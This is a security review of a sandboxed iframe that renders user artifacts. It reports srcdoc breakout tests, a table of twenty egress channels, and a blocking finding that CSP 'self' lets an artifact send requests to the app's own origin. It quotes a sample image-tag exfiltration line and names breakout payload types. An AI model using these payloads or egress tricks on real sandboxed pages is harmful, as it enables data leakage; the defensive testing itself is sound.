# AZ6 review — Artifacts render as content

Fresh, independent, read-only re-review. Base `origin/main` 057aa1b8, branch `claude/pipeline-az6-12697d`, whole change uncommitted. I did not write this code and did not perform the earlier review; everything below is re-derived from the current source, and the previous review document was discarded rather than carried forward.

**measured** = I ran it in this worktree and read the output. *read* = I only read it. Nothing in this document rests on `probes/`, on `round.md` §9/§10, or on the previous review's verdict.

Working tree restored exactly as found: the one file I mutated (`build-srcdoc.ts`) was copied out first and restored three times, each verified with `shasum -a 256 -c` (OK each time). `git status --porcelain` is 34 entries before and after. No `plans/**` artifact was touched — neither AZ6 spec writes screenshots.

## Gates I ran

| Command | Result |
|---|---|
| `npm run check` | `typecheck-gate: PASS — all 54 packages checked`, exit 0 |
| `npm run lint` | `governance-lint: PASS — 3690 tracked files … 0 production + 0 development known violation(s)`, exit 0 |
| `npm run test` | 239 files / **2205 tests passed**, exit 0 |
| `npm run knip:production` | exit 0 |
| `npx playwright test __e2e__/AZ6-artifact-frame.spec.ts __e2e__/AZ6-artifact-content.spec.ts` | **13 passed** (18.8s) |

No new failure in any gate is attributable to this change.

**On the stale-server trap.** I checked `lsof -nP -iTCP:5179` before running and the port was free, then ran with `CI=1` so `reuseExistingServer` is `false`. The server was started by that run, from this worktree. The 13/13 is real.

---

## 1. The srcdoc attribute — attacked, and it holds

`framework/design-system/src/artifact-frame/build-srcdoc.ts:155-157`, `:260-270`.

`escapeSrcdocAttribute` replaces `&` **before** `"`. Measured: `escapeSrcdocAttribute('a"b&c')` → `a&quot;b&amp;c`. That is the correct order.

**Breakout attempts (measured).** I drove real Chromium (149.0.7827.55) against a host page served over `http://127.0.0.1:<port>`, injected the *real* `buildArtifactSrcdoc(html)` output into a `sandbox="allow-scripts"` iframe, and ran 14 payloads: bare quote + `onload`, `"></iframe><script>`, `&quot;`, `&amp;quot;`, `&#34;`, `&#x22;`, triple-encoded forms, backslash-quote, NUL + `\x01\x0b\x0c`, an unpaired surrogate `\uD800`, exotic whitespace (`      \t \n \r \f`) inside the tag, a full `<!doctype html>` document carrying its own permissive `<meta CSP>` and a `<base href>`, a bare `</iframe>`, and a nested `srcdoc`-in-`srcdoc`.

For every one of the 14, with the real escaping: the shell frame still contained exactly **1** nested `#artifact` iframe, the shell's own `document.body.innerHTML` contained no artifact-authored element or handler, and no breakout URL reached my listener.

**Positive control — my detector works.** I built the identical shell with the escape step skipped (same template, artifact spliced in raw). Then `bare-quote-onload`, `close-iframe-script`, `nul-and-controls`, `unpaired-surrogate` and `weird-whitespace` **all broke out**: nested iframes dropped to **0**, the artifact's code ran in the shell context, and my listener recorded `BREAKOUT-ONLOAD`, `BREAKOUT-SCRIPT`, `BREAKOUT-NUL`, `BREAKOUT-SUR`, `BREAKOUT-WS`.

**Answer to the deciding question: no. An artifact cannot execute in the shell's context.**

**Round-trip fidelity (measured).** 21 hostile strings (raw quotes, `&quot;`, `&amp;quot;`, `&#34;`, `&#x22;`, `&amp;amp;`, `&ampx`, `&notit;`, `<>&"'`, an unpaired surrogate, `\v\f`, `  `, CRLF/tab, an astral emoji, an accented char + em dash + NBSP + thin space, empty string, padded spaces) were fed through the frame twice — once via the shipped two-layer path, once via the one-layer `buildArtifactDocument` control — and the artifact reported back `textContent`, attribute values and `innerHTML` for each. **The two paths are byte-identical** (`JSON.stringify(nested) === JSON.stringify(direct)` → `true`), and all 21 strings survive intact inside the frame. The escaping is lossless.

## 2. The two-layer claim — re-earned, and falsifiable

**Shipped (measured).** An artifact attempting eight self-navigations (`meta refresh`, `location.href`, `location.replace`, `location.assign`, an anchor click, a form submit, `window.open(_,"_self")`, `history.pushState`) reached a third-party listener **zero** times.

**Break 1 — collapse to one layer.** `buildArtifactSrcdoc` returning `buildArtifactDocument(html)` (everything else identical): my listener recorded `META-REFRESH`. Against the *shipped spec*, the same mutation turned **6 of 8** tests red.

**Break 2 — `frame-src 'none'` → `frame-src *`** in the shipped source: the shipped spec went **red naming the channel** — `Error: channel PREFETCH reached the outside listener`, and `Error: channel META-REFRESH reached the outside listener` in the navigation test. My own probe additionally recorded `SELF-NAV` and `NESTED-IFRAME`.

**Break 3 — loosen only the *inner* policy, shell intact:** zero hits. This isolates the mechanism: it is the **shell's** `frame-src` that pins the artifact, exactly as `build-srcdoc.ts:95-98` claims.

**Did the shell layer add a new capability? No.** Measured from inside a real artifact on the real permalink: `parent.document` → SecurityError, `top.document` → SecurityError, `document.cookie` → SecurityError, `localStorage.setItem` → SecurityError, `origin` → `null`, `window.frameElement` → `null`, `window.__HYPERIDLE__` → `undefined`. The shell's relay (`build-srcdoc.ts:217-225`) forwards only `method === "ui/notifications/size-changed"` from its own child; the app handler (`ArtifactFrame.tsx:70-76`) additionally requires `event.source === frameRef.current.contentWindow` and clamps. Measured height lie: an artifact posting `height: 99999` every 50 ms produced a declared `1200px` and a painted 504px (70vh of a 720px viewport). The artifact cannot forge or suppress anything beyond its own height, within that clamp.

**The escaped-state backstop cannot be tripped by an artifact** — it would need the *shell* iframe to fire `load` twice, and the artifact cannot navigate its parent (SecurityError under every configuration I tried). See non-blocking N3.

---

## Findings

### AZ6-B1 — BLOCKING — the artifact CAN reach the network: `'self'` resolves to the app's own origin, not to nothing

**Where.** `framework/design-system/src/artifact-frame/build-srcdoc.ts:107-120` (`script-src 'self'`, `img-src 'self' data:`, `style-src 'self'`, `media-src 'self' data:`, `font-src 'self' data:`); the claim it rests on at `.pipeline/work/AZ6/round.md` §3.7 line 134 — *"`'self'` matches nothing from an opaque origin, so the effective grant is inline script, inline style and `data:` URIs"*; the user-facing claim at `framework/design-system/src/ArtifactFrame.tsx:48` — *"Runs sealed — it can't reach your data, your session or the network."*

**Failing scenario, measured in the running app.** I started a dev server from this worktree on 5181, served an artifact of kind `html` on the real permalink whose body is:

```html
<img src="http://localhost:5181/api/leak?body=THE-USERS-SECRET-DOC" alt="">
```

Outcome: the request was **dispatched to the network layer** — my route handler received `http://localhost:5181/api/leak?body=THE-USERS-SECRET-DOC`. Path and query are entirely chosen by whoever wrote the artifact.

Same page, five more app-origin requests all left the frame — `<img>`, CSS `background-image: url()`, `<link rel=preload>`, and `<script src>` (which returned a real **HTTP 404 from the server**, so it unambiguously went over the wire). A `<img>` pointed at a *third-party* origin in the same artifact failed with `net::ERR_BLOCKED_BY_CSP` and never reached my listener.

Isolated with two servers on two ports to be sure this is not a probe artefact: from inside the sealed frame, `img` / `css url()` / `@font-face` / `media` / `script src` / `prefetch` / `preload` **all reach the app's origin and none reach any other origin**. `fetch`, `iframe src` and self-navigation reach neither.

**Why.** For a `srcdoc` document in a sandboxed frame, Chromium resolves CSP `'self'` against the opaque origin's **precursor** — the embedding page's origin. So every `'self'` in this policy is a grant to HyperIdle's own origin, and §3.7's stated reason for writing `'self'` is factually wrong.

**Impact.** `applications/desktop/src/main.ts:667` loads the **remote** `serverUrl` in shared mode, so the app's origin is a real host over the network; the artifact's GETs land in that server's (and any intermediary's) logs with attacker-chosen data in the URL. In local mode (`main.ts:564`) the origin is loopback, so it stays on the machine but still reaches the app's own server. The response is not readable (ORB blocked every one) and no credential is attached (auth is a header, not a cookie — measured: `document.cookie` throws, `__HYPERIDLE__` is undefined), so this is egress, not data theft. That does not rescue the sentence: **"it can't reach … the network" is false as painted**, and a label that overstates a security boundary is the specific thing `ArtifactFrame.tsx:41-47`'s own lore says must not ship.

**Governing authority.** plan.md AC #4 (the isolation decision must be *recorded*; the record states the mechanism incorrectly and lists these channels as closed); `round.md` §3.8 — *"Closed — nothing reached a real listener by any of these: … image and `sendBeacon` … CSS `url()`, `@font-face`, … prefetch/preload"*, which is true only for a third-party listener; and the shipped string at `ArtifactFrame.tsx:48`.

### AZ6-B2 — BLOCKING — the seal spec cannot see B1, and its `APP-API` channel assertion is structurally incapable of failing

**Where.** `layers/core-ui/__e2e__/AZ6-artifact-frame.spec.ts:117` (`APP-API` in `HTTP_CHANNELS`), `:138` (`t(function () { fetch("/api/artifacts"); });`), `:241-246` (the per-channel loop and `expect(httpHits).toEqual([])`), and the header comment at `:5-6` claiming the artifact "fails every egress channel it can reach".

**Evidence.** The listener at `:33-41` is a separate HTTP server on its own ephemeral port — a **third-party origin**. The `APP-API` attempt requests `/api/artifacts`, which resolves to the *app* origin. Nothing in the suite ever requests the URL `http://127.0.0.1:<outsidePort>/APP-API`, so `expect(httpHits).not.toContain("APP-API")` cannot fail under any implementation. The comment at `:246` — *"Nothing at all, including anything this list has not thought of"* — is false: `httpHits` is blind to every same-origin request by construction.

**Failing scenario, measured.** I changed `connect-src 'none'` → `connect-src 'self'` in `build-srcdoc.ts:114` — granting a hostile artifact `fetch`, `XMLHttpRequest`, `WebSocket` and `sendBeacon` against HyperIdle's own API — and ran the shipped spec: **8 passed, 0 failed.** The behavioural guard cited as "the exfiltration proof" is green while the artifact can call the app's API. (The jsdom test at `AZ6-artifact-frame.test.tsx:35` does catch that *particular* string edit, so the CSP constant is guarded as text; nothing guards the behaviour.)

This is the same shape as the `/META-REFRESH` bug `round.md` §10 describes: an assertion that looks thorough and cannot fail, cited for a claim broader than it can test.

**Governing authority.** `round.md` §6 (the approved evidence plan cites this spec as the proof "the frame is sealed"); `.claude/rules/testing.md` — the assertion does not test the property it is named for.

---

### Non-blocking defects

**AZ6-N1 — the test named for the escape order cannot fail if the order is flipped.**
`framework/design-system/src/__tests__/AZ6-artifact-frame.test.tsx:88-93` asserts `escapeSrcdocAttribute("&quot;") === "&amp;quot;"`. Both orderings produce that string (the input has no raw `"`), so the assertion is vacuous. Measured: I flipped the two `replaceAll` calls in `build-srcdoc.ts:156` and this test **stayed green** while two neighbours went red (`:84` → `expected 'a&amp;quot;b' to be 'a&quot;b'`, and `:112-119`). So the property *is* covered — by the assertion above it, not by the one documenting it. Also: the doc comment at `build-srcdoc.ts:150-153` says the wrong order would produce "re-openable text"; flipping it actually produces harmless double-encoding, i.e. a fidelity bug, not a hole. Restored byte-identically (sha256 verified).

**AZ6-N2 — `PARENT-NAV` is an assertion I could not make fail.**
`AZ6-artifact-frame.spec.ts:147`. `window.parent.location.href = …`, `.replace()` and `= …` all throw `SecurityError` under every configuration I built: shipped; plus `allow-top-navigation`; plus `allow-same-origin allow-top-navigation` with `default-src *; frame-src *`; and single-layer with no shell at all. The channel really is closed — by the platform's sandboxed-navigation rule, not by anything in this code — but the assertion can never go red, so it is a passenger rather than a guard.

**AZ6-N3 — the escaped-state backstop is unreachable, and its UI can never be seen.**
`framework/design-system/src/ArtifactFrame.tsx:94-128`. It fires only if the **shell** iframe fires `load` twice. The artifact cannot navigate the shell (N2), the shell's `srcDoc` is recomputed only when the `html` prop changes, and `useFetch` (`layers/core-ui/src/hooks/useFetch.ts`) does not poll or refetch — so no input produces a second load. The state, its `role="alert"` copy and the "Run it again" button are exercised only by a synthetic `fireEvent.load` in jsdom (`AZ6-artifact-frame.test.tsx:248-279`). Its own lore admits "a case nothing in the artifact can reach today". Small, but it is user-facing surface the plan did not ask for and nothing can reach.

**AZ6-N4 — the record and the code disagree on how many channels there are.**
`round.md` §3.8 and §10 say "seventeen channels"; `AZ6-artifact-frame.spec.ts:97-117` lists **19** HTTP channels plus WebRTC. Cosmetic, but the count is quoted as evidence.

**AZ6-N5 — copy nits in the unrenderable state.**
`framework/design-system/src/kinds/artifact-unrenderable.tsx:83` produces *"HyperIdle supports image artifacts, but this one wasn't saved in the shape a image artifact takes"* — "a image". And `:68` produces *"This html artifact is empty"*, showing the raw machine kind to a user. Both measured on the real permalink.

**AZ6-N6 — a small image still sits in a full-width bordered box.**
`ArtifactPreviewSurface.tsx:43` (`SURFACE_FULL … items-stretch`) stretches `ImagePayload`'s `<figure>` to the panel. `round.md` §10 records this as deliberately left; noting it so it stays visible.

### Notes, not defects

**AZ6-NOTE-1 — `webrtc 'block'` is confirmed dead in this Chromium, and the neutraliser is what works.** Measured, Chromium 149: the console logs `Unrecognized Content-Security-Policy directive 'webrtc'` on every artifact load, and with the directive present but `RTC_NEUTRALISER` removed, **4 UDP packets** reached a real bound `dgram` socket. With the shipped code: **0 packets**, `typeof RTCPeerConnection === "undefined"`, `Object.defineProperty` → `TypeError`, assignment a no-op, `delete` → `false`, and every borrowed realm (`srcdoc` child, `about:blank` child, `allow-same-origin` child) → `SecurityError`; `new Worker(blob:)` and `import("data:…")` are both blocked by the policy. The lore at `:100-105` is accurate. A directive no browser honours is a comment in a policy — it is labelled as such in the code, which is the right call, but worth re-checking the day the policy is edited.

**AZ6-NOTE-2 — the Tailwind `@source` defect is real and correctly worked around.** `layers/core-ui/src/index.css:78` points at `layers/design-system/`, which does not exist (`ls` confirms). So the inline `style={{ listStyleType }}` in `ListPayload.tsx:34` is justified, and the `@lore` explaining it is accurate. Fixing the glob is out of scope here.

**AZ6-NOTE-3 — WP identifiers appear outside `.pipeline/`.** `@lore AZ6` comments (exempt by convention) but also the test/spec filenames `AZ6-*.test.tsx`, `AZ6-*.spec.ts`. This matches long-standing precedent in this repo (`AM5-*`, `AE6-*`, `AF16-*`, `AU21-*`), so I am recording it rather than raising it.

---

## What I verified works

- **Prose renders as a document.** Screenshot of the real permalink at 1280×900: `Q3 pricing decision` in mixed case, sans stack, left-aligned, real bullets, a rendered table, a `<details>` disclosure, a code fence. Zero unknown-block stripes.
- **An `html` artifact runs and is interactive.** Measured on the real permalink: its own stylesheet applied, its script wrote `402 this week`, clicking its button changed it to `489 projected`, and the caption sits beneath it.
- **The unrenderable state no longer lies.** Measured on the real permalink for all four paths the brief named: empty `text` → `reason="empty"`, *"This text artifact is empty"*, **no** source control; `image` with no url → `reason="malformed"`, *"This image artifact can't be read"*, source control present; `code` with a string preview → `malformed`; empty `html` → `empty`, no frame painted; unregistered `spreadsheet` → `unknown-kind`, *"doesn't know how to display yet"*, source control present. `isRegisteredKind` is genuinely used (`artifact-unrenderable.tsx:30,58`). The tests can fail on each: they assert `not.toMatch(/doesn't know how to display/i)` per row and assert the `data-unrenderable-reason` discriminant per row, so the old single-sentence behaviour fails every one.
- **The sandbox is un-loosenable through the code.** `ARTIFACT_FRAME_SANDBOX` has one definition (`build-srcdoc.ts:85`) and three uses, all inside `ArtifactFrame.tsx` and the shell template. `ArtifactFrameProps` is `{ html, title? }` — no sandbox, policy or bridge prop. Measured in the browser: outer `sandbox="allow-scripts"` with no `src`, inner `#artifact` `sandbox="allow-scripts"`.
- **The props union does what it claims.** `npm run check` passes with every call site supplying `sanitizeHtml`; the union at `ArtifactPreviewSurface.tsx:36-38` makes a full-size preview unconstructable without it.
- **Updated tests replaced expectations legitimately.** Each edit pins behaviour this work package deliberately changes: the `html` kind no longer falls to `UnknownPayload`; the unknown-kind fallback is now the designed state; `reason` enums became sentences (`Block.test.tsx:151`, `payloads.test.tsx:194` still assert the unknown shell renders *and* still shows the source); the Artifact export family grew 7→8 with a written reason in `closed-view-family.test.ts`. Two tests were deleted (`'html' kind without sanitizeHtml → UnknownPayload`, in both `AM5-compose-artifact-body.test.tsx` and `AE6-kind-renderers.test.tsx`) — both pinned a fallback that no longer exists because the prop is now type-required. Nothing was weakened to match worse code.
- **Stories exist for both new states.** `ArtifactFrame.stories.tsx` (three real single-file pages, one interactive, one canvas) and `ArtifactPreviewSurface.stories.tsx` gained `ProseFull`, `UnrenderableUnknownKind`, `UnrenderableEmpty`, `UnrenderableMalformed`.
- **Scope holds.** No change to how artifacts are produced or stored (nothing under `layers/core-api/`); no separate origin, no app-wide CSP, no artifact↔app bridge, no page anatomy, no artifact lists, no editing. The two shared-surface changes (`UnknownPayload` wording, `ListPayload` markers) are the ones `round.md` §8.2/§8.3 records the founder approving.

---

## The 17-plus egress channels, one row each

19 HTTP channels are named at `AZ6-artifact-frame.spec.ts:97-117`, plus WebRTC at `:244` — 20 assertions, not the 17 the record claims (N4). "Shown red by me" means I removed the mitigation and personally watched that channel reach a real listener.

| # | Channel | Closed by | Shown red by me | How I broke it |
|---|---|---|---|---|
| 1 | FETCH | `connect-src 'none'` | **yes** | `connect-src *` → hit third-party listener |
| 2 | XHR | `connect-src 'none'` | **yes** | same |
| 3 | WEBSOCKET | `connect-src 'none'` | **yes** | same |
| 4 | EVENTSOURCE | `connect-src 'none'` | **yes** | same |
| 5 | SENDBEACON | `connect-src 'none'` | **yes** | same |
| 6 | IMG | `img-src 'self' data:` | **yes, third-party only** | `img-src *` → hit. **Open to the app's origin as shipped** (B1) |
| 7 | CSS-URL | `img-src` | **yes, third-party only** | `img-src *` → hit. Open to the app's origin (B1) |
| 8 | FONT | `font-src 'self' data:` | **yes, third-party only** | `font-src *` → hit. Open to the app's origin (B1) |
| 9 | PRELOAD | `img-src` | **yes, third-party only** | `img-src *` → hit. Open to the app's origin (B1) |
| 10 | PREFETCH | `default-src`/`img`/`font`/`connect` | **yes, third-party only** | went red under every loosening. Open to the app's origin (B1) |
| 11 | NESTED-IFRAME | `frame-src 'none'` | **yes** | `frame-src *` → hit |
| 12 | SELF-NAV | shell `frame-src 'none'` | **yes** | `frame-src *` → hit; layer collapse → spec red |
| 13 | META-REFRESH | shell `frame-src 'none'` | **yes** | `frame-src *` → shipped spec red naming `META-REFRESH`; layer collapse → hit |
| 14 | FORM | shell `frame-src 'none'` (**not** `form-action`/`allow-forms`) | **yes** | needed `frame-src *` **and** `allow-forms` **and** `form-action *` together; loosening form-action + allow-forms alone changes nothing |
| 15 | TARGET-BLANK | sandbox (no `allow-popups`) | **yes** | `allow-popups` → hit |
| 16 | WINDOW-OPEN | sandbox (no `allow-popups`) | **yes** | `allow-popups` → hit |
| 17 | TOP-NAV | sandbox (no `allow-top-navigation`) | **yes** | `allow-top-navigation` → hit |
| 18 | PARENT-NAV | the platform's sandboxed-navigation rule | **NO — not coverable** | `SecurityError` under 4 configurations incl. `allow-same-origin allow-top-navigation` + `frame-src *`. Genuinely closed; the assertion cannot fail (N2) |
| 19 | APP-API | nominally `connect-src 'none'` | **NO — the assertion is vacuous** | `connect-src 'self'` grants the artifact fetch/XHR/WS/beacon against HyperIdle's own API and the spec stays 8/8 green (B2) |
| 20 | WEBRTC (UDP) | `RTC_NEUTRALISER` (the `webrtc` directive is dead) | **yes** | neutraliser deleted → **4 UDP packets** at a bound `dgram` socket |

Plus, not in the list and closed as claimed (measured): parent/top DOM, `document.cookie`, `localStorage`, the Electron preload bridge (`__HYPERIDLE__` undefined), same-origin ES-module `import()` (rejected), reading any response body (ORB / CORS), and breaking out of the shell's `srcdoc` attribute (14 payloads).

---

## Acceptance criteria

| # | Criterion | Verdict | Evidence I produced |
|---|---|---|---|
| 1 | An artifact of a supported kind renders as content, not source text | **PASS** | Screenshot of a real `text` permalink: h1/p/ul/table/details/code as elements, mixed case, no stripe. Screenshot + interaction of a real `html` permalink: own stylesheet applied, script wrote `402 this week`, click → `489 projected`. `composeArtifactBody` covers all six registered kinds; both e2e specs 13/13 against a server started from this worktree. |
| 2 | Preview chrome does not alter case, font family, alignment or colour | **PASS** | Computed in Chromium on the rendered `<h1>` of the real permalink: `text-transform: none`; `font-family: system-ui, -apple-system, "Segoe UI", sans-serif` (no mono); `text-align: start`; `color: rgb(42, 36, 21)` = `--text-primary`, not `--text-tertiary` `rgb(147, 139, 112)`; heading box starts 12px inside the panel; `innerText` reads `Q3 pricing decision`. `ul` computes `list-style-type: disc`. All four nouns measured in a browser, none by class name. |
| 3 | An unrenderable artifact shows a user-readable explanation and an explicit way to view its source | **PASS** | Measured on the real permalink for all five reachable paths (empty `text`, `image` with no url, `code` with a non-object preview, empty `html`, unregistered `spreadsheet`): three distinct sentences, correct `data-unrenderable-reason` each, source control present only where there is source, hidden until pressed and re-hidden on "Hide source". No supported kind is told its kind is unsupported. Copy nits at N5. |
| 4 | The isolation decision is recorded before implementation | **FAIL** | The record (`round.md` §3) is thorough and pre-dates the build, and the code holds most of it: one home for the sandbox and policy, no prop to loosen either, `frame-src` and the RTC neutraliser both shown red by me. But §3.7's stated mechanism — *"`'self'` matches nothing from an opaque origin"* — is measurably false, §3.8 lists five channels as closed that are open to the app's own origin, and the sentence painted under every artifact says the network is unreachable while I dispatched an artifact-chosen `GET …?body=THE-USERS-SECRET-DOC` from inside the frame in the running app (B1). The behavioural guard cannot see any of it (B2). A record that is wrong about the isolation it records does not hold this criterion. |

---

## Verdict

**NOT-DONE**
